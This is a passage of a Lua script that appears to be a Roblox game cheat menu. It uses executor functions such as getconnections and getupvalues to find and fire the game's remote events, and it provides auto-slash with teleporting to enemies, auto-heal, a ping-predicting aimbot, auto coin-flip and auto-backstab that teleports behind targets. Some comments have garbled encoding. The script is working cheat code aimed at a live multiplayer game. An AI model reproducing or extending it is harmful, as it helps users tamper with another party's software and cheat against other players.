1580 |             for _, conn in ipairs(slashConnections) do
1581 |                 pcall(function() conn:Fire() end)
1582 |             end
1583 |             pcall(function() slashButton:Activate() end)
1584 |         end
1585 |     end
1586 | 
1587 |     -- üß≠ UI
1588 |     local ModeDropdown = Tabs.Main:AddDropdown("SlashMode", {
1589 |         Title = "Slash Mode",
1590 |         Values = { "AI Aimbot", "Player Aimbot" },
1591 |         Default = "AI Aimbot"
1592 |     })
1593 |     ModeDropdown:OnChanged(function(Value)
1594 |         mode = Value
1595 |     end)
1596 | 
1597 |     local SlashToggle = Tabs.Main:AddToggle("SlashToggle", {
1598 |         Title = "Auto Slash",
1599 |         Default = false
1600 |     })
1601 |     SlashToggle:OnChanged(function(Value)
1602 |         enabled = Value
1603 |     end)
1604 | 
1605 |     local DistanceSlider = Tabs.Main:AddSlider("DistanceSlider", {
1606 |         Title = "Distance",
1607 |         Min = 1, Max = 50, Default = 5,
1608 |         Rounding = 1, ValueName = "studs"
1609 |     })
1610 |     DistanceSlider:OnChanged(function(Value)
1611 |         if not sliderInitialized then
1612 |             sliderInitialized = true
1613 |             return
1614 |         end
1615 |         maxDistance = Value
1616 |     end)
1617 | 
1618 |     -- ‚ö° Helpers
1619 |     local function getRelativeTeleportPosition(hrp, targetHRP)
1620 |         local toTarget = (hrp.Position - targetHRP.Position).Unit
1621 |         return targetHRP.Position + (toTarget * 2)
1622 |     end
1623 | 
1624 |     local function teleportAndSlash(target, spam)
1625 |         if cooldown then return end
1626 |         local hrp = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
1627 |         local kHRP = target:FindFirstChild("HumanoidRootPart")
1628 |         if not hrp or not kHRP then return end
1629 | 
1630 |         cooldown = true
1631 |         lastTarget = target
1632 | 
1633 |         local start = tick()
1634 |         local conn
1635 |         conn = RunService.Heartbeat:Connect(function()
1636 |             if not (lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") and kHRP and kHRP.Parent) then
1637 |                 if conn then conn:Disconnect() end
1638 |                 cooldown = false
1639 |                 lastTarget = nil
1640 |                 return
1641 |             end
1642 | 
1643 |             if tick() - start >= TELEPORT_DURATION then
1644 |                 if conn then conn:Disconnect() end
1645 |                 task.delay((mode == "AI Aimbot") and AI_DELAY or TELEPORT_DURATION, function()
1646 |                     cooldown = false
1647 |                     lastTarget = nil
1648 |                 end)
1649 |                 return
1650 |             end
1651 | 
1652 |             local newPos = getRelativeTeleportPosition(hrp, kHRP)
1653 |             hrp.CFrame = CFrame.new(newPos, kHRP.Position)
1654 | 
1655 |             if spam then useSlash() end
1656 |         end)
1657 |     end
1658 | 
1659 |     -- ‚öîÔ∏è AI Aimbot Mode (auto t√¨m trong Killers folder)
1660 |     RunService.Heartbeat:Connect(function()
1661 |         if not enabled or cooldown or mode ~= "AI Aimbot" then return end
1662 |         local char = lp.Character
1663 |         if not (char and char:FindFirstChild("HumanoidRootPart")) then return end
1664 |         local hrp = char.HumanoidRootPart
1665 | 
1666 |         for _, killer in ipairs(killersFolder:GetChildren()) do
1667 |             if killer:FindFirstChild("HumanoidRootPart") then
1668 |                 local kHRP = killer.HumanoidRootPart
1669 |                 local dist = (hrp.Position - kHRP.Position).Magnitude
1670 |                 if dist <= maxDistance and killer ~= lastTarget then
1671 |                     teleportAndSlash(killer, true)
1672 |                     break
1673 |                 end
1674 |             end
1675 |         end
1676 |     end)
1677 | 
1678 |     -- üëÅÔ∏è Player Aimbot Mode
1679 |     local function attachAnimMonitor(character)
1680 |         local humanoid = character:WaitForChild("Humanoid", 5)
1681 |         if not humanoid then return end
1682 | 
1683 |         humanoid.AnimationPlayed:Connect(function(animTrack)
1684 |             if not enabled or mode ~= "Player Aimbot" or cooldown then return end
1685 |             local animId = animTrack.Animation and animTrack.Animation.AnimationId
1686 |             if animId and table.find(monitoredAnimations, animId) then
1687 |                 for _, killer in ipairs(killersFolder:GetChildren()) do
1688 |                     if killer:FindFirstChild("HumanoidRootPart") then
1689 |                         local hrpLocal = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
1690 |                         local kHRP = killer:FindFirstChild("HumanoidRootPart")
1691 |                         if hrpLocal and kHRP then
1692 |                             local dist = (kHRP.Position - hrpLocal.Position).Magnitude
1693 |                             if dist <= maxDistance * 5 then
1694 |                                 teleportAndSlash(killer, false)
1695 |                                 break
1696 |                             end
1697 |                         end
1698 |                     end
1699 |                 end
1700 |             end
1701 |         end)
1702 |     end
1703 | 
1704 |     if lp.Character then
1705 |         attachAnimMonitor(lp.Character)
1706 |     end
1707 |     lp.CharacterAdded:Connect(attachAnimMonitor)
1708 | end
1709 | 
1710 | 
1711 | 
1712 | do
1713 |     local Players = game:GetService("Players")
1714 |     local RunService = game:GetService("RunService")
1715 |     local lp = Players.LocalPlayer
1716 | 
1717 |     -- Vars
1718 |     local healEnabled = false
1719 |     local healHPThreshold = 50
1720 |     local healDistance = 50
1721 | 
1722 |     -- Heal button + remote
1723 |     local healButton, healRemote, healConnections = nil, nil, {}
1724 | 
1725 |     -- t√¨m RemoteEvent t·ª´ button Heal
1726 |     local function findHealRemote()
1727 |         if healRemote then return healRemote end
1728 |         if not healButton then return nil end
1729 |         for _, conn in ipairs(getconnections(healButton.MouseButton1Click)) do
1730 |             local f = conn.Function
1731 |             if f and islclosure(f) then
1732 |                 local upvals = getupvalues(f)
1733 |                 for _, v in pairs(upvals) do
1734 |                     if typeof(v) == "Instance" and v:IsA("RemoteEvent") then
1735 |                         healRemote = v
1736 |                         warn("[AutoHeal] Found Heal Remote:", v:GetFullName())
1737 |                         return healRemote
1738 |                     end
1739 |                 end
1740 |             end
1741 |         end
1742 |         return nil
1743 |     end
1744 | 
1745 |     local function initHealButton()
1746 |         local gui = lp:FindFirstChild("PlayerGui")
1747 |         if not gui then return end
1748 |         local mainUI = gui:FindFirstChild("MainUI")
1749 |         local container = mainUI and mainUI:FindFirstChild("AbilityContainer")
1750 |         healButton = container and container:FindFirstChild("FriedChicken")
1751 |         if healButton and healButton:IsA("ImageButton") then
1752 |             healConnections = getconnections(healButton.MouseButton1Click)
1753 |             findHealRemote()
1754 |         end
1755 |     end
1756 | 
1757 |     initHealButton()
1758 |     lp.CharacterAdded:Connect(function()
1759 |         task.wait(0.5)
1760 |         initHealButton()
1761 |     end)
1762 | 
1763 |     local function useHeal()
1764 |         if healRemote then
1765 |             pcall(function()
1766 |                 healRemote:FireServer(true)
1767 |                 task.delay(0.05, function()
1768 |                     healRemote:FireServer(false)
1769 |                 end)
1770 |             end)
1771 |         elseif healButton then
1772 |             for _, conn in ipairs(healConnections) do
1773 |                 pcall(function() conn:Fire() end)
1774 |             end
1775 |             pcall(function() healButton:Activate() end)
1776 |         end
1777 |     end
1778 | 
1779 |     -- UI ------------------------------------------------
1780 |     local HealToggle = Tabs.Main:AddToggle("HealToggle", {
1781 |         Title = "Auto Heal",
1782 |         Default = false
1783 |     })
1784 |     HealToggle:OnChanged(function(v) healEnabled = v end)
1785 | 
1786 |     local HealHPSlider = Tabs.Main:AddSlider("HealHPSlider", {
1787 |         Title = "Heal HP",
1788 |         Min = 1, Max = 100, Default = 50,
1789 |         Rounding = 0, ValueName = "HP"
1790 |     })
1791 |     HealHPSlider:OnChanged(function(v) healHPThreshold = v end)
1792 | 
1793 |     local HealDistanceSlider = Tabs.Main:AddSlider("HealDistanceSlider", {
1794 |         Title = "Distance",
1795 |         Min = 1, Max = 150, Default = 50,
1796 |         Rounding = 0, ValueName = "studs"
1797 |     })
1798 |     HealDistanceSlider:OnChanged(function(v) healDistance = v end)
1799 | 
1800 |     -- Helpers -------------------------------------------------------------
1801 |     local function getPlayersFolders()
1802 |         local pf = workspace:FindFirstChild("Players")
1803 |         if not pf then return nil, nil, nil end
1804 |         return pf, pf:FindFirstChild("Killers"), pf:FindFirstChild("Survivors")
1805 |     end
1806 | 
1807 |     local function belongsToMe(m)
1808 |         if not (m and m:IsA("Model")) then return false end
1809 |         if m:GetAttribute("Username") == lp.Name then return true end
1810 |         local UsernameSV = m:FindFirstChild("Username")
1811 |         if UsernameSV and typeof(UsernameSV.Value) == "string" and UsernameSV.Value == lp.Name then return true end
1812 |         local Owner = m:FindFirstChild("Owner") or m:FindFirstChild("Player")
1813 |         if Owner and Owner.Value == lp then return true end
1814 |         local uidAttr = m:GetAttribute("UserId")
1815 |         if uidAttr and tonumber(uidAttr) == lp.UserId then return true end
1816 |         if m.Name == lp.Name then return true end
1817 |         return false
1818 |     end
1819 | 
1820 |     local function getMyShedletsky()
1821 |         local pf, killersFolder, survivorsFolder = getPlayersFolders()
1822 |         local candidates = {}
1823 | 
1824 |         local function scan(container)
1825 |             if not container then return end
1826 |             for _, d in ipairs(container:GetDescendants()) do
1827 |                 if d:IsA("Model") and d.Name == "Shedletsky" and d:FindFirstChild("Humanoid") and d:FindFirstChild("HumanoidRootPart") then
1828 |                     if belongsToMe(d) then table.insert(candidates, d) end
1829 |                 end
1830 |             end
1831 |         end
1832 | 
1833 |         scan(killersFolder)
1834 |         scan(survivorsFolder)
1835 |         scan(workspace)
1836 | 
1837 |         if #candidates == 0 then return nil, nil, nil end
1838 | 
1839 |         local basePos
1840 |         if lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then
1841 |             basePos = lp.Character.HumanoidRootPart.Position
1842 |         end
1843 | 
1844 |         local best, bestDist = candidates[1], math.huge
1845 |         if basePos then
1846 |             for _, m in ipairs(candidates) do
1847 |                 local hrp = m:FindFirstChild("HumanoidRootPart")
1848 |                 if hrp then
1849 |                     local d = (hrp.Position - basePos).Magnitude
1850 |                     if d < bestDist then best, bestDist = m, d end
1851 |                 end
1852 |             end
1853 |         end
1854 | 
1855 |         local hum = best:FindFirstChildOfClass("Humanoid")
1856 |         local hrp = best:FindFirstChild("HumanoidRootPart")
1857 |         return best, hum, hrp
1858 |     end
1859 | 
1860 |     local function getNearestKillerDist(fromHRP, myModel)
1861 |         local _, killersFolder = getPlayersFolders()
1862 |         if not (killersFolder and fromHRP) then return math.huge end
1863 |         local nearest = math.huge
1864 |         for _, k in ipairs(killersFolder:GetChildren()) do
1865 |             if k ~= myModel then
1866 |                 local khrp = k:FindFirstChild("HumanoidRootPart")
1867 |                 if khrp then
1868 |                     local d = (fromHRP.Position - khrp.Position).Magnitude
1869 |                     if d < nearest then nearest = d end
1870 |                 end
1871 |             end
1872 |         end
1873 |         return nearest
1874 |     end
1875 | 
1876 |     -- Main loop ----------------------------------------------------------
1877 |     RunService.Heartbeat:Connect(function()
1878 |         if not healEnabled then return end
1879 | 
1880 |         local myModel, myHumanoid, myHRP = getMyShedletsky()
1881 |         if not (myModel and myHumanoid and myHRP) then return end
1882 |         if myHumanoid.Health <= 0 then return end
1883 | 
1884 |         local nearestDist = getNearestKillerDist(myHRP, myModel)
1885 | 
1886 |         if myHumanoid.Health <= healHPThreshold and nearestDist >= healDistance then
1887 |             useHeal()
1888 |         end
1889 |     end)
1890 | end
1891 | 
1892 | 
1893 | 
1894 |     Tabs.Main:AddSection("‚Ü≥Chance")
1895 | 
1896 | 
1897 | 
1898 | do
1899 | local Players = game:GetService("Players")
1900 | local RunService = game:GetService("RunService")
1901 | local Stats = game:GetService("Stats")
1902 | local ReplicatedStorage = game:GetService("ReplicatedStorage")
1903 | 
1904 | local LocalPlayer = Players.LocalPlayer
1905 | 
1906 | local active = false
1907 | local useOffset = true
1908 | local predictionMode = "Speed"
1909 | local aimMode = "Normal"
1910 | local aimDuration = 1.7
1911 | local fasterDuration = 1.5
1912 | local spinDuration = 0.5
1913 | local aimTargets = {"Slasher", "c00lkidd", "JohnDoe", "1x1x1x1", "Noli", "Guest 666", "Sixer"}
1914 | 
1915 | local Humanoid, HRP = nil, nil
1916 | local originalWS, originalJP, originalAutoRotate = nil, nil, nil
1917 | local aiming = false
1918 | local prevFlintVisibleAim = false
1919 | local lastTriggerTime = 0
1920 | 
1921 | local autoCoinflip = false
1922 | local coinflipTargetCharge = 3
1923 | local coinflipCooldown = 0.15
1924 | local lastCoinflipTime = 0
1925 | 
1926 | local blockCoinflipWhenClose = true
1927 | local coinflipBlockDist = 50
1928 | 
1929 | local RemoteEvent
1930 | pcall(function()
1931 |     RemoteEvent = ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Network"):WaitForChild("RemoteEvent")
1932 | end)
1933 | 
1934 | -- ================= GUI =================
1935 | Tabs.Main:AddDropdown("AimMode", {
1936 |     Title = "Aim Mode",
1937 |     Values = {"Normal", "Faster", "Reflex"},
1938 |     Default = "Normal",
1939 |     Callback = function(val) aimMode = val end
1940 | })
1941 | 
1942 | Tabs.Main:AddDropdown("PredictionMode", {
1943 |     Title = "Prediction Mode",
1944 |     Values = {"Speed", "Ping", "front", "No Lag"},
1945 |     Default = "Speed",
1946 |     Callback = function(val) predictionMode = val end
1947 | })
1948 | 
1949 | Tabs.Main:AddDropdown("CoinflipChargeDropdown", {
1950 |     Title = "Select Score",
1951 |     Values = {"1 Point", "2 Point", "3 Point"},
1952 |     Default = "3 Point",
1953 | }):OnChanged(function(val)
1954 |     local num = tonumber(val and val:match("%d+"))
1955 |     if num then coinflipTargetCharge = num end
1956 | end)
1957 | 
1958 | Tabs.Main:AddInput("CoinflipDistance", {
1959 |     Title = "Distance",
1960 |     Default = "50",
1961 |     Placeholder = "Enter studs",
1962 |     Callback = function(val)
1963 |         local num = tonumber(val)
1964 |         if num and num > 0 then
1965 |             coinflipBlockDist = num
1966 |         end
1967 |     end
1968 | })
1969 | 
1970 | Tabs.Main:AddToggle("BlockCoinflipToggle", {
1971 |     Title = "Safe Mode",
1972 |     Default = true,
1973 | }):OnChanged(function(state)
1974 |     blockCoinflipWhenClose = state
1975 | end)
1976 | 
1977 | Tabs.Main:AddToggle("OffsetToggle", {
1978 |     Title = "Enable Offset",
1979 |     Default = true,
1980 |     Callback = function(state) useOffset = state end
1981 | })
1982 | 
1983 | Tabs.Main:AddToggle("AimbotToggle", {
1984 |     Title = "Auto Aim Shoot",
1985 |     Default = false,
1986 |     Callback = function(state) active = state end
1987 | })
1988 | 
1989 | Tabs.Main:AddToggle("AutoCoinflipToggle", {
1990 |     Title = "Auto Coin Flip",
1991 |     Default = false,
1992 | }):OnChanged(function(state)
1993 |     autoCoinflip = state
1994 | end)
1995 | 
1996 | -- ================= Character Setup =================
1997 | local function setupCharacter(char)
1998 |     Humanoid = char:WaitForChild("Humanoid")
1999 |     HRP = char:WaitForChild("HumanoidRootPart")
2000 | end
2001 | if LocalPlayer.Character then setupCharacter(LocalPlayer.Character) end
2002 | LocalPlayer.CharacterAdded:Connect(setupCharacter)
2003 | 
2004 | -- ================= Helpers =================
2005 | local function getValidTarget()
2006 |     -- Qu√©t t·∫•t c·∫£ Players
2007 |     for _, plr in ipairs(Players:GetPlayers()) do
2008 |         if plr ~= LocalPlayer and plr.Character then
2009 |             local char = plr.Character
2010 |             local hrp = char:FindFirstChild("HumanoidRootPart")
2011 |             if hrp then
2012 |                 for _, targetName in ipairs(aimTargets) do
2013 |                     if char.Name:lower():find(targetName:lower()) then
2014 |                         return hrp
2015 |                     end
2016 |                 end
2017 |             end
2018 |         end
2019 |     end
2020 |     return nil
2021 | end
2022 | 
2023 | local function getPingSeconds()
2024 |     local pingStat = Stats.Network.ServerStatsItem["Data Ping"]
2025 |     if pingStat then return pingStat:GetValue() / 1000 end
2026 |     return 0.1
2027 | end
2028 | 
2029 | local function isFlintlockVisible()
2030 |     if not LocalPlayer.Character then return false end
2031 |     local flint = LocalPlayer.Character:FindFirstChild("Flintlock", true)
2032 |     if not flint then return false end
2033 |     if not (flint:IsA("BasePart") or flint:IsA("MeshPart") or flint:IsA("UnionOperation")) then
2034 |         flint = flint:FindFirstChildWhichIsA("BasePart", true)
2035 |         if not flint then return false end
2036 |     end
2037 |     return flint.Transparency < 1
2038 | end
2039 | 
2040 | local movementThreshold = 0.5
2041 | local function getPredictedAimPosPing(targetHRP)
2042 |     local ping = getPingSeconds()
2043 |     local velocity = targetHRP.Velocity
2044 |     if velocity.Magnitude <= movementThreshold then return targetHRP.Position end
2045 |     return targetHRP.Position + (velocity * ping)
2046 | end
2047 | 
2048 | local function getPredictedAimPosInfrontHRPPing(targetHRP)
2049 |     local ping = getPingSeconds()
2050 |     local studs = ping * 60
2051 |     if targetHRP.Velocity.Magnitude <= movementThreshold then return targetHRP.Position end
2052 |     return targetHRP.Position + (targetHRP.CFrame.LookVector * studs)
2053 | end
2054 | 
2055 | local function computeAimPos(targetHRP)
2056 |     if predictionMode == "Ping" then
2057 |         return getPredictedAimPosPing(targetHRP)
2058 |     elseif predictionMode == "front" then
2059 |         return targetHRP.Position + targetHRP.CFrame.LookVector * 4
2060 |     elseif predictionMode == "No Lag" then
2061 |         return getPredictedAimPosInfrontHRPPing(targetHRP)
2062 |     else
2063 |         local velocity = targetHRP.Velocity
2064 |         if velocity.Magnitude > 0.1 then
2065 |             if useOffset and HRP then
2066 |                 local ok, toTarget = pcall(function() return (targetHRP.Position - HRP.Position).Unit end)
2067 |                 if not ok then return targetHRP.Position end
2068 |                 local moveDir = velocity.Unit
2069 |                 local dot = toTarget:Dot(moveDir)
2070 |                 if math.abs(dot) < 0.85 then
2071 |                     return targetHRP.Position + velocity * (4 / 60)
2072 |                 else
2073 |                     return targetHRP.Position
2074 |                 end
2075 |             else
2076 |                 return targetHRP.Position
2077 |             end
2078 |         else
2079 |             return targetHRP.Position
2080 |         end
2081 |     end
2082 | end
2083 | 
2084 | local function safeSetCFrame(newCF)
2085 |     if typeof(newCF) == "CFrame" and tostring(newCF) ~= "nan" and HRP then
2086 |         HRP.CFrame = newCF
2087 |     end
2088 | end
2089 | 
2090 | local function faceInstant(toPos)
2091 |     if not HRP or not toPos then return end
2092 |     local fromPos = HRP.Position
2093 |     if (toPos - fromPos).Magnitude < 0.01 then return end
2094 |     local lookAt = Vector3.new(toPos.X, fromPos.Y, toPos.Z)
2095 |     local targetCF = CFrame.new(fromPos, lookAt)
2096 |     safeSetCFrame(HRP.CFrame:Lerp(targetCF, 0.99))
2097 | end
2098 | 
2099 | -- ================= Coinflip helpers =================
2100 | local function getAbilityContainer()
2101 |     local ok, container = pcall(function()
2102 |         local gui = LocalPlayer:FindFirstChild("PlayerGui")
2103 |         if not gui then return nil end
2104 |         local mainUI = gui:FindFirstChild("MainUI")
2105 |         if not mainUI then return nil end
2106 |         return mainUI:FindFirstChild("AbilityContainer")
2107 |     end)
2108 |     if ok then return container end
2109 |     return nil
2110 | end
2111 | 
2112 | local function tryActivateButton(button)
2113 |     if not button then return false end
2114 |     pcall(function() if button.Activate then button:Activate() end end)
2115 |     local ok, conns = pcall(function()
2116 |         if type(getconnections) == "function" and button.MouseButton1Click then
2117 |             return getconnections(button.MouseButton1Click)
2118 |         end
2119 |         return nil
2120 |     end)
2121 |     if ok and conns then
2122 |         for _, conn in ipairs(conns) do
2123 |             pcall(function()
2124 |                 if conn.Function then conn.Function()
2125 |                 elseif conn.func then conn.func()
2126 |                 elseif conn.Fire then conn.Fire() end
2127 |             end)
2128 |         end
2129 |     end
2130 |     pcall(function() if button.Activated then button.Activated:Fire() end end)
2131 |     pcall(function() if button.MouseButton1Click then button.MouseButton1Click:Fire() end end)
2132 |     return true
2133 | end
2134 | 
2135 | local function findAbilityButtonByName(name)
2136 |     local container = getAbilityContainer()
2137 |     if not container then return nil end
2138 |     local btn = container:FindFirstChild(name)
2139 |     if btn then return btn end
2140 |     local lname = name:lower()
2141 |     for _, child in ipairs(container:GetChildren()) do
2142 |         if child.Name and child.Name:lower():find(lname) then return child end
2143 |         local found = child:FindFirstChildWhichIsA("ImageButton") or child:FindFirstChildWhichIsA("TextButton")
2144 |         if found and found.Name and found.Name:lower():find(lname) then
2145 |             return found
2146 |         end
2147 |     end
2148 |     return nil
2149 | end
2150 | 
2151 | local function clickCoinflipButton()
2152 |     local tryNames = {"CoinFlip", "Coin", "Reroll"}
2153 |     for _, n in ipairs(tryNames) do
2154 |         local b = findAbilityButtonByName(n)
2155 |         if b then
2156 |             if tryActivateButton(b) then return true end
2157 |         end
2158 |     end
2159 |     return false
2160 | end
2161 | 
2162 | local function findRerollContainer()
2163 |     local container = getAbilityContainer()
2164 |     if not container then return nil end
2165 |     local reroll = container:FindFirstChild("Reroll") or container:FindFirstChild("RerollAbility") or nil
2166 |     if reroll then return reroll end
2167 |     for _, child in ipairs(container:GetChildren()) do
2168 |         for _, obj in ipairs(child:GetDescendants()) do
2169 |             if (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox")) and obj.Text and tostring(obj.Text):match("%d") then
2170 |                 return child
2171 |             end
2172 |         end
2173 |     end
2174 |     return nil
2175 | end
2176 | 
2177 | local function getNearbyMaxNumber()
2178 |     local reroll = findRerollContainer()
2179 |     if not reroll then return nil end
2180 |     local maxNum = nil
2181 |     for _, obj in ipairs(reroll:GetDescendants()) do
2182 |         if (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox")) and obj.Text then
2183 |             for num in tostring(obj.Text):gmatch("%d+") do
2184 |                 local n = tonumber(num)
2185 |                 if n then
2186 |                     if not maxNum or n > maxNum then maxNum = n end
2187 |                 end
2188 |             end
2189 |         end
2190 |     end
2191 |     return maxNum
2192 | end
2193 | 
2194 | -- ================= Main loop =================
2195 | RunService.RenderStepped:Connect(function()
2196 |     -- AIMBOT LOGIC
2197 |     if active and Humanoid and HRP then
2198 |         local isVisible = isFlintlockVisible()
2199 |         if isVisible and not prevFlintVisibleAim and not aiming then
2200 |             lastTriggerTime = tick()
2201 |             aiming = true
2202 |         end
2203 |         prevFlintVisibleAim = isVisible
2204 | 
2205 |         if aiming then
2206 |             local elapsed = tick() - lastTriggerTime
2207 | 
2208 |             if aimMode == "Reflex" then
2209 |                 if elapsed <= spinDuration then
2210 |                     local spinProgress = elapsed / spinDuration
2211 |                     local spinAngle = math.rad(360 * spinProgress)
2212 |                     safeSetCFrame(CFrame.new(HRP.Position) * CFrame.Angles(0, spinAngle, 0))
2213 |                 elseif elapsed <= spinDuration + 0.7 then
2214 |                     if not originalWS then
2215 |                         originalWS, originalJP, originalAutoRotate = Humanoid.WalkSpeed, Humanoid.JumpPower, Humanoid.AutoRotate
2216 |                     end
2217 |                     Humanoid.AutoRotate = false
2218 |                     HRP.AssemblyAngularVelocity = Vector3.zero
2219 |                     local targetHRP = getValidTarget()
2220 |                     if targetHRP then
2221 |                         faceInstant(computeAimPos(targetHRP))
2222 |                     end
2223 |                 else
2224 |                     aiming = false
2225 |                     if originalWS then
2226 |                         Humanoid.WalkSpeed, Humanoid.JumpPower, Humanoid.AutoRotate =
2227 |                             originalWS, originalJP, originalAutoRotate
2228 |                         originalWS, originalJP, originalAutoRotate = nil, nil, nil
2229 |                     end
2230 |                 end
2231 |             else
2232 |                 local duration = (aimMode == "Faster") and fasterDuration or aimDuration
2233 |                 if elapsed <= duration then
2234 |                     if not originalWS then
2235 |                         originalWS, originalJP, originalAutoRotate = Humanoid.WalkSpeed, Humanoid.JumpPower, Humanoid.AutoRotate
2236 |                     end
2237 |                     Humanoid.AutoRotate = false
2238 |                     HRP.AssemblyAngularVelocity = Vector3.zero
2239 |                     local targetHRP = getValidTarget()
2240 |                     if targetHRP then
2241 |                         faceInstant(computeAimPos(targetHRP))
2242 |                     end
2243 |                 else
2244 |                     aiming = false
2245 |                     if originalWS then
2246 |                         Humanoid.WalkSpeed, Humanoid.JumpPower, Humanoid.AutoRotate =
2247 |                             originalWS, originalJP, originalAutoRotate
2248 |                         originalWS, originalJP, originalAutoRotate = nil, nil, nil
2249 |                     end
2250 |                 end
2251 |             end
2252 |         end
2253 |     end
2254 | 
2255 |     -- COINFLIP LOGIC
2256 |     if autoCoinflip then
2257 |         local tooClose = false
2258 |         if blockCoinflipWhenClose then
2259 |             local targetHRP = getValidTarget()
2260 |             if targetHRP and HRP then
2261 |                 if (targetHRP.Position - HRP.Position).Magnitude <= coinflipBlockDist then
2262 |                     tooClose = true
2263 |                 end
2264 |             end
2265 |         end
2266 | 
2267 |         if not tooClose then
2268 |             local maxNum = getNearbyMaxNumber()
2269 |             if not maxNum or maxNum < coinflipTargetCharge then
2270 |                 if tick() - lastCoinflipTime >= coinflipCooldown then
2271 |                     lastCoinflipTime = tick()
2272 |                     local ok = clickCoinflipButton()
2273 |                     if not ok and RemoteEvent then
2274 |                         pcall(function()
2275 |                             RemoteEvent:FireServer("UseActorAbility", "CoinFlip")
2276 |                         end)
2277 |                     end
2278 |                 end
2279 |             end
2280 |         end
2281 |     end
2282 | end)
2283 | end
2284 | 
2285 | 
2286 | 
2287 |     Tabs.Main:AddSection("Two Time")
2288 | 
2289 | 
2290 | --// Auto Backstab Unified (AI Aimbot + Player Aimbot, t·ª± ƒë·ªông qu√©t Killers Folder)
2291 | do
2292 |     local Players = game:GetService("Players")
2293 |     local RunService = game:GetService("RunService")
2294 |     local lp = Players.LocalPlayer
2295 | 
2296 |     -- ‚öôÔ∏è Config
2297 |     local Mode = "AI Aimbot"
2298 |     local checkRadius = 18
2299 |     local backstabDelay = 0.01
2300 | 
2301 |     local killersFolder = workspace:WaitForChild("Players"):WaitForChild("Killers")
2302 | 
2303 |     local ANIM_IDS = {
2304 |         "115194624791339",
2305 |         "86545133269813",
2306 |         "89448354637442",
2307 |         "77119710693654",
2308 |         "107640065977686",
2309 |         "112902284724598",
2310 |     }
2311 | 
2312 |     -- üîò UI
2313 |     Tabs.Main:AddDropdown("BackstabMode", {
2314 |         Title = "Backstab Mode",
2315 |         Values = { "AI Aimbot", "Player Aimbot" },
2316 |         Default = "AI Aimbot",
2317 |     }):OnChanged(function(value)
2318 |         Mode = value
2319 |         print("üéØ Backstab Mode:", value)
2320 |     end)
2321 | 
2322 |     local enabled = false
2323 |     Tabs.Main:AddToggle("AutoBackstab", {
2324 |         Title = "Auto Backstab V2",
2325 |         Default = false
2326 |     }):OnChanged(function(state)
2327 |         enabled = state
2328 |         print("üî™ Auto Backstab:", state and "ON" or "OFF")
2329 |     end)
2330 | 
2331 |     Tabs.Main:AddInput("BackstabRadiusInput", {
2332 |         Title = "Check Radius",
2333 |         Default = tostring(checkRadius),
2334 |         Placeholder = "Write Here (1 - 50)",
2335 |         Numeric = true,
2336 |         Callback = function(value)
2337 |             local num = tonumber(value)
2338 |             if num then
2339 |                 checkRadius = math.clamp(num, 1, 50)
2340 |                 print("üìè Check Radius set to:", checkRadius)
2341 |             else
2342 |                 print("‚ö†Ô∏è Nh·∫≠p s·ªë h·ª£p l·ªá!")
2343 |             end
2344 |         end
2345 |     })
2346 | 
2347 |     -- =====================
2348 |     -- üó°Ô∏è Dagger Remote Finder
2349 |     -- =====================
2350 |     local daggerButton, daggerRemote, daggerConnections = nil, nil, {}
2351 | 
2352 |     local function findDaggerRemote()
2353 |         if daggerRemote then return daggerRemote end
2354 |         if not daggerButton then return nil end
2355 |         for _, conn in ipairs(getconnections(daggerButton.MouseButton1Click)) do
2356 |             local f = conn.Function
2357 |             if f and islclosure(f) then
2358 |                 for _, v in pairs(getupvalues(f)) do
2359 |                     if typeof(v) == "Instance" and v:IsA("RemoteEvent") then
2360 |                         daggerRemote = v
2361 |                         warn("[Backstab] Found Dagger Remote:", v:GetFullName())
2362 |                         return daggerRemote
2363 |                     end
2364 |                 end
2365 |             end
2366 |         end
2367 |         return nil
2368 |     end
2369 | 
2370 |     local function initDaggerButton()
2371 |         local gui = lp:FindFirstChild("PlayerGui")
2372 |         if not gui then return end
2373 |         local mainUI = gui:FindFirstChild("MainUI")
2374 |         local container = mainUI and mainUI:FindFirstChild("AbilityContainer")
2375 |         daggerButton = container and container:FindFirstChild("Dagger")
2376 |         if daggerButton and daggerButton:IsA("ImageButton") then
2377 |             daggerConnections = getconnections(daggerButton.MouseButton1Click)
2378 |             findDaggerRemote()
2379 |         end
2380 |     end
2381 | 
2382 |     initDaggerButton()
2383 |     lp.CharacterAdded:Connect(function()
2384 |         task.wait(0.5)
2385 |         initDaggerButton()
2386 |     end)
2387 | 
2388 |     local function useDagger()
2389 |         if daggerRemote then
2390 |             pcall(function()
2391 |                 daggerRemote:FireServer(true)
2392 |                 task.delay(0.05, function()
2393 |                     daggerRemote:FireServer(false)
2394 |                 end)
2395 |             end)
2396 |         elseif daggerButton then
2397 |             for _, conn in ipairs(daggerConnections) do
2398 |                 pcall(function() conn:Fire() end)
2399 |             end
2400 |             pcall(function() daggerButton:Activate() end)
2401 |         end
2402 |     end
2403 | 
2404 |     -- =====================
2405 |     -- ‚öíÔ∏è Helpers
2406 |     -- =====================
2407 |     local function getCharacter()
2408 |         local ch = lp.Character
2409 |         if ch and ch.Parent then
2410 |             local hrp = ch:FindFirstChild("HumanoidRootPart")
2411 |             local humanoid = ch:FindFirstChildOfClass("Humanoid")
2412 |             return ch, humanoid, hrp
2413 |         end
2414 |         return nil, nil, nil
2415 |     end
2416 | 
2417 |     local function isPlayingTargetAnimation(humanoid)
2418 |         if not humanoid then return false end
2419 |         for _, t in ipairs(humanoid:GetPlayingAnimationTracks()) do
2420 |             local animId = tostring(t.Animation.AnimationId or "")
2421 |             for _, id in ipairs(ANIM_IDS) do
2422 |                 if animId:find(id, 1, true) then
2423 |                     return true
2424 |                 end
2425 |             end
2426 |         end
2427 |         return false
2428 |     end
2429 | 
2430 |     local function teleportBehind(targetHRP, myHRP)
2431 |         local look = targetHRP.CFrame.LookVector
2432 |         local destPos = targetHRP.Position - look * 2
2433 |         myHRP.CFrame = CFrame.new(destPos, destPos + look)
2434 |     end
2435 | 
2436 |     local function isBehindTarget(targetHRP, myHRP)
2437 |         local look = targetHRP.CFrame.LookVector
2438 |         local dir = (myHRP.Position - targetHRP.Position).Unit
2439 |         return look:Dot(dir) < -0.5
2440 |     end
2441 | 
